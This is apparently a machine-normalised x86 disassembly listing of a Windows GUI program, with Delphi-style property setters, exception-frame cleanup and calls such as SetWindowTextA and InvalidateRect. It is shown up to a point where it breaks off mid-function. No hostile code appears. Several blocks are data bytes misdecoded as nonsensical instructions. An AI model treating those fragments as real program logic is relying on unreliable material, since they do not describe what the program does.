cmp dl [ eax + 0x24 ]
je r-xdata
retn
mov [ eax + 0x24 ] dl
mov [ eax + 0x25 ] 0x0
xor edx edx
call sub_41936c
sub_4362bc
mov al [ eax + 0x25 ]
xor al 0x1
retn
sub_4362c4
cmp dl [ eax + 0x25 ]
je r-xdata
retn
mov [ eax + 0x25 ] dl
call sub_4362d4
sub_43630c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_436324
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x1
je r-xdata
mov al 0x1
retn
sub_436360
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
xor edx edx
call sub_41936c
sub_436390
mov ecx [ eax + 0x14 ]
cmp edx ecx
jge r-xdata
cmp edx 0x2710
jle r-xdata
mov edx ecx
mov [ eax + 0x18 ] edx
mov edx [ eax + 0x10 ]
call sub_436408
retn
mov edx 0x2710
sub_4363b4
test edx edx
jge r-xdata
mov ecx [ eax + 0x18 ]
cmp edx ecx
jle r-xdata
xor edx edx
mov [ eax + 0x14 ] edx
mov edx [ eax + 0x10 ]
call sub_436408
retn
mov edx ecx
sub_4363d0
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
xor edx edx
call sub_41936c
sub_436450
cmp edx [ eax + 0x20 ]
je r-xdata
retn
mov [ eax + 0x20 ] edx
xor edx edx
call sub_41936c
sub_4364a4
or ecx 0xffffffff
xor edx edx
call sub_4364f4
retn
sub_4364c4
mov eax [ eax + 0x18 ]
retn
sub_43676c
jmp sub_403a2c
sub_43688e
jmp sub_403a2c
sub_436895
mov eax [ ebp - 0x4 ]
call sub_4533f0
pop ecx
pop ecx
pop ebp
retn
sub_436a4a
jmp sub_403a2c
sub_436ae8
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_436b08
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_436b54
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_4535f4
sub_436b68
cmp dl [ eax + 0x221 ]
je r-xdata
retn
mov [ eax + 0x221 ] dl
call sub_4535f4
sub_436b7c
cmp dl [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] dl
call sub_4535f4
sub_436b90
cmp dl [ eax + 0x222 ]
je r-xdata
retn
mov [ eax + 0x222 ] dl
call sub_4535f4
sub_436ba4
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_436e51
jmp sub_403a2c
sub_436e58
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_436ffe
jmp sub_403a2c
sub_4373ea
jmp sub_403a2c
sub_437407
jmp sub_403a2c
sub_437418
push ebx
mov ebx eax
mov eax ebx
call sub_454530
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_437668
jmp sub_403a2c
sub_43766f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437692
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405298
retn
sub_43768b
jmp sub_403a2c
sub_437692
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4376f4
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_43774c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_436460
retn
sub_43775c
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_437770
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_437a06
jmp sub_403a2c
sub_437b3e
jmp sub_403a2c
sub_437b45
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437ba0
mov al [ eax + 0xd ]
xor al 0x1
retn
sub_437c40
cmp edx [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] edx
call sub_437a1c
sub_437c50
cmp edx [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] edx
xor edx edx
call sub_41936c
sub_437c60
cmp edx [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] edx
xor edx edx
call sub_41936c
sub_437d64
mov eax [ eax + 0x18 ]
retn
sub_437e77
jmp sub_403a2c
sub_437ecc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_404100
pop esi
pop ebx
retn
sub_437fda
jmp sub_403a2c
sub_437fe1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4381dc
push ebx
mov ebx eax
mov eax ebx
call sub_41a918
mov eax [ ebx + 0x34 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_438214
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
call sub_438aa0
retn
sub_4382ec
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
call sub_438ba8
retn
sub_4382f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_4189b0
pop esi
pop ebx
retn
sub_43830c
mov eax [ eax + 0x34 ]
call sub_418afc
retn
sub_4383dc
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4383d4
cmp ebx [ eax + 0x28c ]
je r-xdata
mov eax ebx
call sub_4032b0
sub_4384a4
push ebx
mov ebx eax
mov eax ebx
call sub_4388f4
push eax
mov eax ebx
call sub_438400
pop edx
call sub_42a824
pop ebx
retn
sub_4388e0
push esi
mov esi eax
test edx edx
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4388f4
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x244 ] 0x0
je r-xdata
xchg edx eax
call sub_438b2c
retn
mov eax [ eax + 0x18 ]
retn
sub_438940
mov eax [ eax + 0x8 ]
call sub_4382f8
retn
sub_438a20
or ecx 0xffffffff
xor edx edx
call sub_438a2c
retn
sub_438b54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_438aa0
mov ecx 0x1
mov edx esi
call sub_42a910
pop esi
pop ebx
retn
sub_438b70
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_456358
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_438aa0
call sub_42a654
sub_438b90
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_438ba8
sub_438d29
jmp sub_403a2c
sub_438d6c
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
call sub_438ba8
sub_439090
jmp sub_403a2c
sub_439097
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4390b9
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4040d0
retn
sub_4390b2
jmp sub_403a2c
sub_4390b9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439347
jmp sub_403a2c
sub_43934e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439370
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4040d0
retn
sub_439369
jmp sub_403a2c
sub_439370
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439378
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438aac
call sub_4383dc
pop esi
pop ebx
retn
sub_439390
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x6
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x1c ] 0xffffffff
mov [ eax + 0x20 ] ecx
pop ebp
retn 0x4
sub_439428
cmp dl [ eax + 0x8 ]
je r-xdata
retn
mov [ eax + 0x8 ] dl
mov eax [ eax + 0x4 ]
call sub_4535f4
sub_43943c
cmp dl [ eax + 0x9 ]
je r-xdata
retn
mov [ eax + 0x9 ] dl
mov eax [ eax + 0x4 ]
call sub_4535f4
sub_439450
cmp dl [ eax + 0xa ]
je r-xdata
retn
mov [ eax + 0xa ] dl
mov eax [ eax + 0x4 ]
call sub_4535f4
sub_43996c
jmp sub_403a2c
sub_439ac2
jmp sub_403a2c
sub_439e19
jmp sub_403a2c
sub_439e20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439e43
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405298
retn
sub_439e3c
jmp sub_403a2c
sub_439e43
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439f21
jmp sub_403778
sub_439f26
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46f50c
call sub_403ae0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a021
jmp sub_403778
sub_43a026
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46f50c
call sub_403ae0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a2ec
cmp dl [ eax + 0x277 ]
je r-xdata
retn
mov [ eax + 0x277 ] dl
call sub_43a060
sub_43a300
cmp dl [ eax + 0x278 ]
je r-xdata
retn
mov [ eax + 0x278 ] dl
call sub_43a060
sub_43a368
cmp dl [ eax + 0x245 ]
je r-xdata
retn
mov [ eax + 0x245 ] dl
call sub_4535f4
sub_43a37c
cmp dl [ eax + 0x27a ]
je r-xdata
retn
mov [ eax + 0x27a ] dl
call sub_43a060
sub_43a390
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_43a060
sub_43a3a4
cmp dl [ eax + 0x276 ]
je r-xdata
retn
mov [ eax + 0x276 ] dl
call sub_43a060
sub_43a3b8
cmp dl [ eax + 0x214 ]
je r-xdata
retn
mov [ eax + 0x214 ] dl
call sub_4535f4
sub_43a3cc
cmp dl [ eax + 0x22a ]
je r-xdata
retn
mov [ eax + 0x22a ] dl
call sub_4535f4
sub_43a428
cmp dl [ eax + 0x228 ]
je r-xdata
retn
mov [ eax + 0x228 ] dl
call sub_4535f4
sub_43a43c
cmp dl [ eax + 0x22b ]
je r-xdata
retn
mov [ eax + 0x22b ] dl
call sub_4535f4
sub_43a450
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423f34
push eax
mov eax ebx
call sub_456054
pop edx
call sub_42a7cc
pop ebx
retn
sub_43a71b
jmp sub_403a2c
sub_43a722
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a740
cmp [ eax + 0x215 ] 0x3
sete al
retn
sub_43a74c
cmp [ eax + 0x264 ] 0x0
setne al
retn
sub_43a798
cmp dl [ eax + 0x238 ]
je r-xdata
retn
mov [ eax + 0x238 ] dl
call sub_4535f4
sub_43a7ac
cmp dl [ eax + 0x216 ]
je r-xdata
retn
mov [ eax + 0x216 ] dl
call sub_4535f4
sub_43a9f4
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4389b8
retn
sub_43ab71
jmp sub_403a2c
sub_43ab78
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ab84
push ebx
mov ebx eax
mov eax ebx
call sub_456054
call sub_42a93c
pop ebx
retn
sub_43ae75
jmp sub_403a2c
sub_43b21f
jmp sub_403a2c
sub_43b3e5
jmp sub_403a2c
sub_43b8ba
jmp sub_403a2c
sub_43b8c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b93c
push ebx
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_43b98c
push ebx
cmp [ eax + 0x362 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x364 ]
call [ ebx + 0x360 ]
sub_43ba05
jmp sub_403a2c
sub_43ba0c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43bb69
jmp sub_403a2c
sub_43bb70
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43bed0
mov eax [ eax + 0x22c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43bedc
push esi
mov esi eax
mov eax [ esi + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_43c148
mov eax [ eax + 0x23c ]
call sub_437d4c
retn
sub_43c1d4
push ebx
cmp [ eax + 0x34a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x34c ]
call [ ebx + 0x348 ]
sub_43c80f
jmp sub_403a2c
sub_43c82c
jmp sub_403a2c
sub_43c833
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c989
jmp sub_403a2c
sub_43c990
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c9a0
mov [ eax + 0x28a ] 0x1
retn
sub_43ce03
jmp sub_403a2c
sub_43ce0a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ce3c
mov [ eax + 0x294 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43cf61
jmp sub_403a2c
sub_43cf68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43cf70
push ebx
cmp [ eax + 0x35a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x35c ]
call [ ebx + 0x358 ]
sub_43cfb4
push ebx
mov ebx eax
mov eax ebx
call sub_456054
call sub_42a9c8
pop ebx
retn
sub_43d241
jmp sub_403a2c
sub_43d248
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d250
mov eax [ eax + 0x22c ]
call sub_438a7c
retn
sub_43d2e5
jmp sub_403a2c
sub_43d2ec
pop ecx
pop ebp
retn
sub_43d2f0
mov eax [ r-xdata ]
retn
sub_43d501
jmp sub_403a2c
sub_43d508
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d6bc
retn
sub_43d7c1
jmp sub_403a2c
sub_43d7c8
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43d8b4
mov edx eax
fld [ edx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_43d8d0
mov edx eax
fld [ edx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_43d8ec
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_43d908
push esi
mov esi [ eax + 0x208 ]
cmp edx esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43d9a1
jmp sub_403778
sub_43dc24
jmp sub_403a2c
sub_43dc2b
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43dd60
jmp sub_403a2c
sub_43dd67
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43dfa0
mov edx [ eax ]
or edx [ eax + 0x4 ]
or edx [ eax + 0x8 ]
or edx [ eax + 0xc ]
sete al
retn
sub_43e0f6
jmp sub_403a2c
sub_43e0fd
push 0x6
call GetSystemMetrics
mov edx eax
shl edx 0x3
add edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_44f034
pop ebx
mov esp ebp
pop ebp
retn
sub_43e11c
cmp [ eax + 0x269 ] 0x0
jne r-xdata
mov [ eax + 0x252 ] 0x0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_43e1f6
add [ eax ] al
push ebx
cmp [ eax + 0x282 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
sub_43e260
push ebx
mov ebx eax
mov eax ebx
call sub_455588
push 0xffffffff
push 0x0
mov eax ebx
call sub_456054
push eax
call InvalidateRect
pop ebx
retn
sub_43e4b6
jmp sub_403a2c
sub_43e4bd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e4c4
push ebx
mov ebx eax
mov eax ebx
call sub_456054
call sub_42aa7c
pop ebx
retn
sub_43e4d8
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_43e5c4
jmp sub_403a2c
sub_43e60c
cmp dl [ eax + 0x250 ]
je r-xdata
retn
mov [ eax + 0x250 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
sete cl
mov edx 0x20
call sub_43618c
sub_43e684
cmp dl [ eax + 0x253 ]
je r-xdata
retn
mov [ eax + 0x253 ] dl
call sub_4535f4
sub_43e698
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
call sub_4535f4
sub_43e6ac
cmp dl [ eax + 0x256 ]
je r-xdata
retn
mov [ eax + 0x256 ] dl
call sub_4535f4
sub_43e6c0
cmp dl [ eax + 0x268 ]
je r-xdata
retn
mov [ eax + 0x268 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx edx
mov edx 0x10
call sub_43618c
sub_43e6e4
cmp dl [ eax + 0x269 ]
je r-xdata
retn
mov [ eax + 0x269 ] dl
call sub_4535f4
sub_43e88c
push ebx
mov ebx eax
mov eax ebx
call sub_4194b0
mov eax ebx
call sub_419390
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43e8f8
push ebx
mov ebx eax
mov [ ebx + 0x20 ] edx
mov eax ebx
call sub_419390
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43e914
push ebx
mov ebx eax
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_419390
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43e930
push ebx
mov ebx eax
mov eax ebx
call sub_430354
pop ebx
retn
sub_43e9a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4304c0
pop esi
pop ebx
retn
sub_43eb49
add [ esp + 0x4 ] 0xffffffec
jmp sub_43fdd8
sub_43eb53
add [ esp + 0x4 ] 0xffffffec
jmp sub_43fec4
sub_43eb5d
add [ esp + 0x4 ] 0xffffffec
jmp sub_43feb0
sub_43eb67
add [ esp + 0x4 ] 0xffffffec
jmp sub_43fd28
sub_43eb7b
add [ esp + 0x4 ] 0xffffffec
jmp sub_405a18
sub_43eb85
add [ esp + 0x4 ] 0xffffffec
jmp sub_405a2c
sub_43eb92
inc ebx
add [ ebx - 0x15 ] bh
inc ebx
add [ ebp + 0x490043eb ] al
jmp sub_43ebe2
sub_43f0d0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x274 ]
push eax
mov ecx [ esi + 0x270 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_43f307
jmp sub_403a2c
sub_43f403
jmp sub_403a2c
sub_43f40a
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f410
bound esp [ edi ]
mov ebx 0xd06a7700
adc [ ebp + 0x4fc00035 ] esp
xlat
shl [ edx - 0x75 ] 0x1
cmp [ edx + eax ] 0x0
add [ ebx + 0x1452ff10 ] cl
retn
sub_43f42c
mov eax [ r-xdata ]
retn
sub_43f434
mov eax [ r-xdata ]
retn
sub_43f536
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x10
retn
sub_43f6cd
jmp sub_403a2c
sub_43f6d4
pop ebx
pop ecx
pop ebp
retn
sub_43f79e
jmp sub_403a2c
sub_43f7a5
pop ecx
pop ebp
retn
sub_43f834
mov eax [ eax + 0x14 ]
call sub_419a00
retn
sub_43f97d
jmp sub_403a2c
sub_43f984
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f9b0
mov eax [ eax + 0x14 ]
call sub_419720
retn
sub_43f9bc
mov eax [ eax + 0x14 ]
call sub_419720
retn
sub_43f9c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov eax [ eax + 0x14 ]
pop esi
pop ebx
retn
sub_43fa2c
mov ecx [ eax ]
call [ ecx + 0x54 ]
retn
sub_43fa34
push ebx
mov ebx ecx
mov eax [ eax + 0x14 ]
call sub_43e9b8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
sub_43fa7c
push esi
mov esi ecx
mov eax [ eax + 0x14 ]
call sub_43e9b8
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
pop esi
retn
sub_43fad0
mov eax [ r-xdata ]
retn
sub_43fad8
mov eax [ r-xdata ]
retn
sub_43fae0
mov ecx [ eax + 0x240 ]
mov [ edx ] ecx
mov ecx [ eax + 0x244 ]
mov [ edx + 0x4 ] ecx
retn
sub_43faf4
mov ecx [ eax + 0x248 ]
mov [ edx ] ecx
mov ecx [ eax + 0x24c ]
mov [ edx + 0x4 ] ecx
retn
sub_43fb08
mov ecx [ eax + 0x250 ]
mov [ edx ] ecx
mov ecx [ eax + 0x254 ]
mov [ edx + 0x4 ] ecx
retn
sub_43fb1c
mov ecx [ eax + 0x258 ]
mov [ edx ] ecx
mov ecx [ eax + 0x25c ]
mov [ edx + 0x4 ] ecx
retn
sub_43fb30
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x240 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x244 ] edx
pop ebp
retn 0x8
sub_43fb4c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x248 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x24c ] edx
pop ebp
retn 0x8
sub_43fb68
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x254 ] edx
pop ebp
retn 0x8
sub_43fb84
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x25c ] edx
pop ebp
retn 0x8
sub_43fc08
jmp sub_403a2c
sub_43fc0f
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_43fce4
jmp sub_403a2c
sub_43fceb
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_43fda8
mov eax [ eax + 0xc ]
call sub_419720
retn
sub_43fe9e
jmp sub_403a2c
sub_43fea5
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43feb0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor eax eax
pop ebp
retn 0x4
sub_43ff5f
jmp sub_403a2c
sub_43ff66
pop ebp
retn
sub_43ff68
sub [ rw-data ] 0x1
retn
sub_43ffd7
jmp [ edi ]
sub_440278
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_440290
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_4402d4
push ebx
mov ebx eax
mov eax ebx
call sub_4409fc
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_4409eb
jmp sub_403a2c
sub_4409fc
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42d0e0
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_4402a4
sub_440a53
jmp sub_403a2c
sub_440a5a
pop ebp
retn
sub_440a5c
sub [ rw-data ] 0x1
retn
sub_444e00
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_444fd3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x2105172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_44538e
jmp sub_403a2c
sub_445395
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44541a
jmp sub_403a2c
sub_445421
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445428
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_452914
pop ebx
retn
sub_44543c
push ebx
mov ebx eax
mov eax ebx
call sub_45566c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_452914
pop ebx
retn
sub_445458
push ebx
mov ebx eax
mov eax ebx
call sub_454640
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_445504
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f854
pop esi
pop ebx
retn
sub_44566e
jmp sub_403a2c
sub_445675
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445784
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_451928
mov eax ebx
mov si 0xffc7
call sub_4034ac
pop esi
pop ebx
retn
sub_445870
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44588c
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_4034ac
sub_4458a8
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_4458b4
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_421440
sub_4458c8
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_445928
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44599c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_4034ac
pop esi
pop ebx
retn
sub_4459b8
push esi
mov esi eax
mov eax esi
call sub_451434
mov eax esi
mov si 0xffc7
call sub_4034ac
pop esi
retn
sub_445a5d
jmp sub_403a2c
sub_445a64
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445a6c
push ebx
mov ebx eax
mov eax ebx
call sub_451598
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_445a90
push ebx
mov ebx eax
mov eax ebx
call sub_4515b0
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_445b7c
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_446188
sub_445b90
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_446188
mov eax ebx
call sub_4535f4
sub_445bb4
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_4535f4
sub_445bc8
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_4535f4
sub_445c0c
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_4535f4
sub_445d0d
jmp sub_403a2c
sub_445d14
pop ebx
pop ecx
pop ebp
retn
sub_445e2c
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_456054
push eax
call SetWindowTextA
pop ebx
retn
sub_445e48
push ebx
